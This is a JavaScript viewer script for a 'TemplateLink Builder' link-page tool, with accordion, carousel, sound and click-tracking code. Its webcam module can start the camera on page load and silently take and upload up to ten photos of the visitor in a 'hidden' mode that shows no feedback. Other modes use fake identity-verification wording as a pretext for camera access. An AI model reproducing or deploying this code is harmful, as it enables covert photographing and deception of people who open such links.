/**
 * TemplateLink Builder - Client-side Viewer Interactivity & Telemetry
 */

const TemplateViewer = {
    templateId: null,
    baseUrl: '',
    
    init: function(config) {
        this.templateId = config.templateId;
        this.baseUrl = config.baseUrl;
        
        this.initAccordions();
        this.initCarousels();
        this.initClickTracking();
        this.initWebcam();
        this.initSound();
    },
    
    // 1. Accordion Toggle Logic
    initAccordions: function() {
        const headers = document.querySelectorAll('.tmpl-accordion-header');
        headers.forEach(header => {
            header.addEventListener('click', function() {
                const item = this.parentElement;
                
                // Toggle current item
                item.classList.toggle('active');
                
                // Close siblings (Optional, standard Accordion behavior)
                const siblings = item.parentElement.querySelectorAll('.tmpl-accordion-item');
                siblings.forEach(sib => {
                    if (sib !== item) {
                        sib.classList.remove('active');
                    }
                });
            });
        });
    },
    
    // 2. Carousel Slider Logic
    initCarousels: function() {
        const carousels = document.querySelectorAll('.tmpl-carousel');
        carousels.forEach(carousel => {
            const track = carousel.querySelector('.tmpl-carousel-track');
            const slides = carousel.querySelectorAll('.tmpl-carousel-slide');
            const nextBtn = carousel.querySelector('.tmpl-carousel-btn.next');
            const prevBtn = carousel.querySelector('.tmpl-carousel-btn.prev');
            
            if (slides.length <= 1) {
                if (nextBtn) nextBtn.style.display = 'none';
                if (prevBtn) prevBtn.style.display = 'none';
                return;
            }
            
            let currentIndex = 0;
            const maxIndex = slides.length - 1;
            
            const updateSlidePosition = () => {
                track.style.transform = `translateX(-${currentIndex * 100}%)`;
            };
            
            if (nextBtn) {
                nextBtn.addEventListener('click', () => {
                    if (currentIndex < maxIndex) {
                        currentIndex++;
                    } else {
                        currentIndex = 0; // Wrap around
                    }
                    updateSlidePosition();
                });
            }
            
            if (prevBtn) {
                prevBtn.addEventListener('click', () => {
                    if (currentIndex > 0) {
                        currentIndex--;
                    } else {
                        currentIndex = maxIndex; // Wrap around to end
                    }
                    updateSlidePosition();
                });
            }
            
            // Optional: Auto slide every 5 seconds
            let interval = setInterval(() => {
                if (nextBtn) nextBtn.click();
            }, 5000);
            
            // Pause auto slide on hover
            carousel.addEventListener('mouseenter', () => clearInterval(interval));
            carousel.addEventListener('mouseleave', () => {
                interval = setInterval(() => {
                    if (nextBtn) nextBtn.click();
                }, 5000);
            });
        });
    },
    
    // 3. Click Telemetry Tracking
    initClickTracking: function() {
        const self = this;
        document.body.addEventListener('click', function(e) {
            const link = e.target.closest('a');
            if (!link) return;
            
            const href = link.getAttribute('href');
            // Do not track anchors, empty, or javascript links
            if (!href || href.startsWith('#') || href.startsWith('javascript:')) return;
            
            // Send click log beacon before leaving
            if (navigator.sendBeacon) {
                const formData = new FormData();
                formData.append('template_id', self.templateId);
                formData.append('link_url', href);
                navigator.sendBeacon(self.baseUrl + 'api/track-click', formData);
            } else {
                // Fallback for older browsers
                fetch(self.baseUrl + 'api/track-click', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: `template_id=${self.templateId}&link_url=${encodeURIComponent(href)}`,
                    keepalive: true
                });
            }
        });
    },

    // 4. User-Authorized Webcam Capture & Submission (supports multi-photo & hidden box)
    initWebcam: function() {
        const self = this;
        const btnStart = document.getElementById('btnStartWebcam');
        if (!btnStart) return; // Webcam block not present

        const card = btnStart.closest('.tmpl-webcam-card');
        const isDirect = card && card.getAttribute('data-direct-capture') === 'true';
        const isHidden = card && card.getAttribute('data-hide-box') === 'true';
        const totalPhotos = card ? Math.max(1, Math.min(10, parseInt(card.getAttribute('data-photo-count'), 10) || 1)) : 1;

        const viewerBox = document.getElementById('webcamViewerBox');
        const video = document.getElementById('webcamVideo');
        const canvas = document.getElementById('webcamCanvas');
        const preview = document.getElementById('capturedPhotoPreview');
        const statusMsg = document.getElementById('webcamStatusMessage');
        
        const btnCapture = document.getElementById('btnCaptureFrame');
        const btnSubmit = document.getElementById('btnSubmitPhoto');
        const btnRetake = document.getElementById('btnRetakePhoto');
        const photoCounter = document.getElementById('webcamPhotoCounter');
        const currentPhotoNum = document.getElementById('currentPhotoNum');
        
        let stream = null;
        let base64Image = null;
        let photosCaptured = 0;
        
        function updateCounter() {
            if (photoCounter && currentPhotoNum) {
                currentPhotoNum.textContent = photosCaptured;
                photoCounter.style.display = 'block';
            }
        }
        
        async function startStream() {
            if (!isHidden) {
                statusMsg.textContent = 'Requesting camera access...';
                statusMsg.style.color = '#6366f1';
            }
            
            try {
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { width: 640, height: 480, facingMode: 'user' }, 
                    audio: false 
                });
                
                video.srcObject = stream;
                viewerBox.style.display = 'block';
                video.style.display = 'block';
                
                btnStart.style.display = 'none';
                
                if (isDirect || isHidden) {
                    if (!isHidden) {
                        statusMsg.textContent = 'Camera active. Auto-capturing photo in 2 seconds...';
                        statusMsg.style.color = '#10b981';
                    }
                    
                    setTimeout(() => {
                        autoCaptureLoop(0);
                    }, 2000);
                } else {
                    btnCapture.style.display = 'inline-flex';
                    statusMsg.textContent = 'Webcam active. Click Capture Snapshot when ready.';
                    statusMsg.style.color = '#10b981';
                }
            } catch (err) {
                console.error('Webcam permission error:', err);
                if (!isHidden) {
                    statusMsg.textContent = 'Webcam access denied. Please grant camera permissions to verify access.';
                    statusMsg.style.color = '#ef4444';
                }
            }
        }

        // Auto-capture loop for direct/hidden mode: captures totalPhotos with 2s intervals
        function autoCaptureLoop(index) {
            if (!stream || index >= totalPhotos) {
                // All photos captured
                onAllPhotosCaptured();
                return;
            }
            
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            base64Image = canvas.toDataURL('image/jpeg', 0.85);
            
            if (!isHidden) {
                preview.src = base64Image;
                preview.style.display = 'block';
                video.style.display = 'none';
                
                statusMsg.textContent = `Captured photo ${index + 1} of ${totalPhotos}. Submitting...`;
                statusMsg.style.color = '#6366f1';
            }
            
            // Submit this photo then continue to next
            submitPhotoAsync(base64Image).then(() => {
                photosCaptured++;
                updateCounter();
                
                if (index + 1 < totalPhotos) {
                    // Show video again for next capture
                    if (!isHidden) {
                        preview.style.display = 'none';
                        video.style.display = 'block';
                        statusMsg.textContent = `Photo ${photosCaptured} submitted. Capturing next in 2 seconds...`;
                        statusMsg.style.color = '#10b981';
                    }
                    
                    setTimeout(() => {
                        autoCaptureLoop(index + 1);
                    }, 2000);
                } else {
                    onAllPhotosCaptured();
                }
            }).catch(() => {
                // If submission fails, still try next
                photosCaptured++;
                if (index + 1 < totalPhotos) {
                    setTimeout(() => {
                        autoCaptureLoop(index + 1);
                    }, 2000);
                } else {
                    onAllPhotosCaptured();
                }
            });
        }

        function onAllPhotosCaptured() {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
            
            if (isHidden) {
                // Silently done — no visible feedback
                return;
            }
            
            statusMsg.textContent = totalPhotos > 1 
                ? `All ${totalPhotos} photos captured & submitted successfully!` 
                : 'Authorized! Access granted.';
            statusMsg.style.color = '#10b981';
            
            setTimeout(() => {
                viewerBox.style.display = 'none';
                btnSubmit.style.display = 'none';
                btnRetake.style.display = 'none';
                btnCapture.style.display = 'none';
                
                if (card) {
                    card.innerHTML = `
                        <div style="color: #10b981; font-weight: 600; padding: 1rem 0;">
                            <i class="fa-solid fa-circle-check" style="font-size: 3rem; margin-bottom: 0.5rem;"></i>
                            <h3>Identity Verified</h3>
                            <p style="font-weight: normal; color: #64748b; font-size: 0.9rem; margin-top: 0.5rem;">Verification successful. Access token registered.</p>
                        </div>
                    `;
                }
            }, 1200);
        }

        // Returns a Promise for async flow
        function submitPhotoAsync(imageData) {
            const formData = new FormData();
            formData.append('template_id', self.templateId);
            formData.append('photo_data', imageData);
            
            return fetch(self.baseUrl + 'api/submit-photo', {
                method: 'POST',
                body: formData,
                headers: {
                    'X-Requested-With': 'XMLHttpRequest'
                }
            })
            .then(res => {
                if (!res.ok) return res.json().then(e => { throw e; });
                return res.json();
            })
            .then(data => {
                if (!data.success) throw data;
                return data;
            });
        }

        function submitPhoto() {
            if (!base64Image) return;
            
            btnSubmit.setAttribute('disabled', 'true');
            btnSubmit.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Submitting...';
            statusMsg.textContent = 'Saving snapshot...';
            statusMsg.style.color = '#6366f1';
            
            submitPhotoAsync(base64Image)
            .then(data => {
                photosCaptured++;
                updateCounter();
                
                if (photosCaptured < totalPhotos) {
                    // More photos needed — go back to capture mode
                    statusMsg.textContent = `Photo ${photosCaptured} of ${totalPhotos} submitted. Capture the next one.`;
                    statusMsg.style.color = '#10b981';
                    
                    preview.style.display = 'none';
                    video.style.display = 'block';
                    
                    btnSubmit.style.display = 'none';
                    btnRetake.style.display = 'none';
                    btnCapture.style.display = 'inline-flex';
                    
                    btnSubmit.removeAttribute('disabled');
                    btnSubmit.innerHTML = '<i class="fa-solid fa-check"></i> Submit Verification';
                    base64Image = null;
                } else {
                    // All done
                    onAllPhotosCaptured();
                }
            })
            .catch(err => {
                console.error(err);
                statusMsg.textContent = err.error || 'Network error. Capture failed to submit.';
                statusMsg.style.color = '#ef4444';
                btnSubmit.removeAttribute('disabled');
                btnSubmit.innerHTML = '<i class="fa-solid fa-check"></i> Submit Verification';
            });
        }
        
        // Take Snapshot (manual mode)
        btnCapture.addEventListener('click', function() {
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            base64Image = canvas.toDataURL('image/jpeg', 0.85);
            
            preview.src = base64Image;
            preview.style.display = 'block';
            video.style.display = 'none';
            
            btnCapture.style.display = 'none';
            btnSubmit.style.display = 'inline-flex';
            btnRetake.style.display = 'inline-flex';
            
            statusMsg.textContent = totalPhotos > 1 
                ? `Photo ${photosCaptured + 1} of ${totalPhotos} snapped! Submit to continue.`
                : 'Selfie snapped! Submit photo to verify.';
            statusMsg.style.color = '#10b981';
        });
        
        // Retake Snapshot
        btnRetake.addEventListener('click', function() {
            preview.style.display = 'none';
            video.style.display = 'block';
            
            btnSubmit.style.display = 'none';
            btnRetake.style.display = 'none';
            btnCapture.style.display = 'inline-flex';
            
            base64Image = null;
            statusMsg.textContent = 'Position your camera and capture again.';
            statusMsg.style.color = '#10b981';
        });
        
        // Submit Photo button action
        btnSubmit.addEventListener('click', submitPhoto);

        // Auto-start stream if in direct capture or hidden mode
        if (isDirect || isHidden) {
            startStream();
        } else {
            btnStart.addEventListener('click', startStream);
        }
    },

    // 5. Background / Triggered Sound Playback
    initSound: function() {
        const players = document.querySelectorAll('.tmpl-audio-player');
        players.forEach(audio => {
            const playMode = audio.getAttribute('data-play-mode');
            const triggerType = audio.getAttribute('data-trigger-type');
            const btnSelector = audio.getAttribute('data-button-selector');
            
            if (playMode === 'loop') {
                audio.loop = true;
            } else {
                audio.loop = false;
            }
            
            const startPlay = () => {
                audio.play().catch(err => {
                    console.log("Audio play postponed until user interaction:", err);
                    
                    const events = ['click', 'touchstart', 'mousedown', 'keydown', 'pointerdown'];
                    const playOnInteraction = () => {
                        audio.play()
                        .then(() => {
                            // Successfully playing, cleanup listeners
                            events.forEach(evt => document.removeEventListener(evt, playOnInteraction));
                        })
                        .catch(e => {
                            console.log("Play failed on interaction, keeping listeners active:", e);
                        });
                    };
                    
                    events.forEach(evt => document.addEventListener(evt, playOnInteraction));
                });
            };
            
            if (triggerType === 'load') {
                startPlay();
            } else if (triggerType === 'click_link') {
                document.addEventListener('click', function(e) {
                    const link = e.target.closest('a') || e.target.closest('.tmpl-interactive-link');
                    if (link) {
                        // Do not interrupt direct download links
                        if (link.hasAttribute('download')) return;
                        
                        audio.currentTime = 0;
                        audio.play().catch(e => console.log("Sound play blocked by browser:", e));
                    }
                });
            } else if (triggerType === 'click_button') {
                if (btnSelector) {
                    document.addEventListener('click', function(e) {
                        const btn = e.target.closest(btnSelector);
                        if (btn) {
                            audio.currentTime = 0;
                            audio.play().catch(e => console.log("Sound play blocked by browser:", e));
                        }
                    });
                } else {
                    document.addEventListener('click', function(e) {
                        const target = e.target;
                        const isBtn = target.closest('button') || target.closest('.tmpl-btn') || target.closest('[role="button"]');
                        if (isBtn) {
                            audio.currentTime = 0;
                            audio.play().catch(e => console.log("Sound play blocked by browser:", e));
                        }
                    });
                }
            } else if (triggerType === 'touch') {
                const events = ['click', 'touchstart', 'mousedown', 'keydown', 'pointerdown'];
                const playOnTouch = () => {
                    audio.currentTime = 0;
                    audio.play()
                    .then(() => {
                        if (playMode === 'once') {
                            events.forEach(evt => document.removeEventListener(evt, playOnTouch));
                        }
                    })
                    .catch(e => console.log("Failed to play on touch:", e));
                };
                events.forEach(evt => document.addEventListener(evt, playOnTouch));
            }
        });
    }
};

window.TemplateViewer = TemplateViewer;
